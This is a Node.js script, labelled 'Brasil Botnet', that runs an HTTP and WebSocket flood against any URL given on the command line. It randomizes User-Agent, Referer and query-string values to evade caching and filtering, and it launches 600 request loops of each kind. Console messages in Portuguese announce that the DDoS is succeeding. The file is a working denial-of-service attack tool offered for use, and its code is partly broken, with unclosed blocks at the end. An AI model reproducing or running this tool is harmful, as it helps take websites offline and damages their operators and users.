const http = require('http');
const WebSocket = require('ws');
const fs = require('fs');
const urlModule = require('url');

let url = '';
let host = '';
const headersUserAgents = fs.readFileSync('useragents.txt', 'utf-8').split('\n');
const headersReferers = fs.readFileSync('referers.txt', 'utf-8').split('\n');
let requestCounter = 0;
let flag = 0;
let safe = 0;

function incCounter() {
  requestCounter += 1;
}

function setFlag(val) {
  flag = val;
}

function setSafe() {
  safe = 1;
}

function buildBlock(size) {
  let outStr = '';
  for (let i = 0; i < size; i++) {
    const a = Math.floor(Math.random() * (90 - 65 + 1)) + 65;
    outStr += String.fromCharCode(a);
  }
  return outStr;
}

function usage() {
  console.log("Brasil Botnet created per Seyzalel");
  console.log("Usage: node brasil.js <url>");
}

function httpCall(targetUrl) {
  let code = 0;
  const paramJoiner = targetUrl.includes("?") ? "&" : "?";
  const options = {
    hostname: host,
    path: targetUrl + paramJoiner + buildBlock(Math.floor(Math.random() * (10 - 3 + 1)) + 3) + '=' + buildBlock(Math.floor(Math.random() * (10 - 3 + 1)) + 3),
    headers: {
      'User-Agent': headersUserAgents[Math.floor(Math.random() * headersUserAgents.length)],
      'Cache-Control': 'no-cache',
      'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
      'Referer': headersReferers[Math.floor(Math.random() * headersReferers.length)] + buildBlock(Math.floor(Math.random() * (10 - 5 + 1)) + 5),
      'Keep-Alive': Math.floor(Math.random() * (120 - 110 + 1)) + 110,
      'Connection': 'keep-alive',
    }
  };

  const req = http.request(options, (res) => {
    incCounter();
  });

  req.on('error', (e) => {
    console.error(`problem with request: ${e.message}`);
    setFlag(1);
    console.log('DDOS ESTA SENDO EXECUTADO COM SUCESSO!');
    code = 500;
  });

  req.end();
  
  return code;
}

function webSocketCall() {
  const ws = new WebSocket('ws://' + host, {
    headers: {
      'User-Agent': headersUserAgents[Math.floor(Math.random() * headersUserAgents.length)],
      'Referer': headersReferers[Math.floor(Math.random() * headersReferers.length)] + buildBlock(Math.floor(Math.random() * (10 - 5 + 1)) + 5),
    }
  });

  ws.on('open', function open() {
    ws.send(buildBlock(Math.floor(Math.random() * (50 - 10 + 1)) + 10));
  });

  ws.on('message', function incoming(data) {
    incCounter();
  });

  ws.on('error', function error(e) {
    console.error(`WebSocket error: ${e.message}`);
  });
}

class HTTPThread {
  run() {
    try {
      while (true) {
        httpCall(url);
      }
    } catch (ex) {
      console.error(ex);
    }
  }
}

class WebSocketThread {
  run() {
    try {
      while (true) {
        webSocketCall();
      }
    } catch (ex) {
      console.error(ex);
    }
  }
}

class MonitorThread {
  run() {
    let previous = requestCounter;
    setInterval(() => {
      if ((previous + 100 < requestCounter) && (previous !== requestCounter)) {
        console.log(`${requestCounter} Requests Sent`);
        previous = requestCounter;
      }
    }, 1000);
  }
}

if (process.argv.length < 3) {
  usage();
} else {
  if (process.argv[2] === "help") {
    usage();
  } else {
    console.log("---- INICIANDO ----");
    if (process.argv.length === 4) {
      if (process.argv[3] === "safe") {
        setSafe();
      }
    }
    url = process.argv[2];
    if (url.split("/").length === 3) {
      url += "/";
    }
    const parsedUrl = new URL(url);
    host = parsedUrl.hostname;

    process.on('SIGINT', () => {
      console.log('\n-- INTERRUPTED --');
      process.exit();
    });

    for (let i = 0; i < 600; i++) {
  setTimeout(() => {
    const t = new HTTPThread();
    t.run();
  }, 0);
}

for (let i = 0; i < 600; i++) {
  setTimeout(() => {
    const ws = new WebSocketThread();
    ws.run();
  }, 0);
}